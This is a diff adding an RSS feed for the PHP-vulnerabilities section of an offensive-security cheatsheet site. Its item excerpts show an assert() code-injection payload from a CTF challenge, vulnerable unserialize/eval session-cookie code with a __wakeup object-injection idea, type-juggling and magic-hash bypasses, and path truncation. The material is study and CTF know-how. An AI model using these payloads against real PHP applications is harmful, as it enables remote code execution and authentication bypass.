@@ -1,0 +1,61 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>PHP Vulnerabilities on Offensive Security Cheatsheet</title>
+    <link>/web-attacks/php-vulnerabilities/</link>
+    <description>Recent content in PHP Vulnerabilities on Offensive Security Cheatsheet</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    
+	<atom:link href="/web-attacks/php-vulnerabilities/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>PHP Filters</title>
+      <link>/web-attacks/php-vulnerabilities/php_filters/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/php-vulnerabilities/php_filters/</guid>
+      <description>PHP Filters # Base64 ?</description>
+    </item>
+    
+    <item>
+      <title>PHP Functions</title>
+      <link>/web-attacks/php-vulnerabilities/functions/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/php-vulnerabilities/functions/</guid>
+      <description>Assert() # The assert() function will execute code in params # Example using root-me challenge ?page=.. Warning : assert() : Assertion &amp;#34;strpos(’includes/...php’, ’..’) === false&amp;#34; failed in path/index.php on line 8 # The request looks like this assert(&amp;#34;strpos(&amp;#39;includes/&amp;#39; . $_GET[&amp;#39;page&amp;#39;] . &amp;#39;.php&amp;#39;, &amp;#39;..&amp;#39;) === false&amp;#34;) # If we inject this ?page=salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons # The request will look like assert(&amp;#34;strpos(&amp;#39;/includes/salade.php&amp;#39;,&amp;#39;..&amp;#39;) || print(&amp;#39;tomate&amp;#39;) || strpos(&amp;#39;oignons.php&amp;#39;,&amp;#39;..&amp;#39;) ===false&amp;#34;) # Then, to exploit ?</description>
+    </item>
+    
+    <item>
+      <title>PHP Serialization</title>
+      <link>/web-attacks/php-vulnerabilities/serialization/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/php-vulnerabilities/serialization/</guid>
+      <description>Resources https://www.owasp.org/index.php/PHP_Object_Injection 
+PHP Serialisation (PHP Slim __wakeup) # Context - \App\Controller\Confidential.php $systemCall = new SystemCall(&amp;#39;system(&amp;#34;ls&amp;#34;);&amp;#39;); if($rank === UserRankService::ADMIN_RANK){ $app-&amp;gt;render(&amp;#39;front/confidential.twig&amp;#39;, array(&amp;#39;admin&amp;#39; =&amp;gt; $rank, &amp;#39;systemCall&amp;#39; =&amp;gt; $systemCall)); }else { $app-&amp;gt;redirect(&amp;#39;/connexion&amp;#39;, &amp;#39;/connexion&amp;#39;, 301); }# Context - \Slim\Middleware\SessionCookie.php if ($value) { try { $_SESSION = unserialize($value); } catch (\Exception $e) { $this-&amp;gt;app-&amp;gt;getLog()-&amp;gt;error(&amp;#39;Error unserializing session cookie value! &amp;#39; . $e-&amp;gt;getMessage()); }# Context - \App\Service\SystemCall.php class SystemCall { public $hook; public $result; function __construct($hook) { $this-&amp;gt;hook = $hook; } function __wakeup() { $this-&amp;gt;result = eval($this-&amp;gt;hook); } function call() { $this-&amp;gt;__wakeup(); } }# You can override the __wakeup() method by crafting your own object and then inject it to execute command # The cookie value is unserialized and then evaluated # Base cookie a:2:{s:10:&amp;#34;slim.</description>
+    </item>
+    
+    <item>
+      <title>PHP Type Juggling</title>
+      <link>/web-attacks/php-vulnerabilities/type_juggling/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/php-vulnerabilities/type_juggling/</guid>
+      <description>Type Juggling and Loose Comparison # Type Juggling # In PHP, “==” returns true if $a equals $b AFTER transtyping &amp;#34;0000&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;0e12&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;1abc&amp;#34; == int(1) -&amp;gt; TRUE &amp;#34;0abc&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;abc&amp;#34; == int(0) -&amp;gt; TRUE # Loose Comparison # In PHP, if “==” is used, then 2 strings beginning by “0e” and filled with numbers will always be equal # It means that you can use magic hashes (0exxxx.</description>
+    </item>
+    
+    <item>
+      <title>Tricks &amp; Others</title>
+      <link>/web-attacks/php-vulnerabilities/tricks_others/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/php-vulnerabilities/tricks_others/</guid>
+      <description>MISC # Path truncation # PHP max path is 4096 char # It is possible to bypass checks for one file, for example, by flooding the path before requesting a resource page=././././././././....... # There is a BIG difference between “$salt” and ‘$salt’. # Double quotes → interpreted as a variable # Simple quotes → interpreted as a string 
+Register Globals index.php ?</description>
+    </item>
+    
+  </channel>
+</rss>
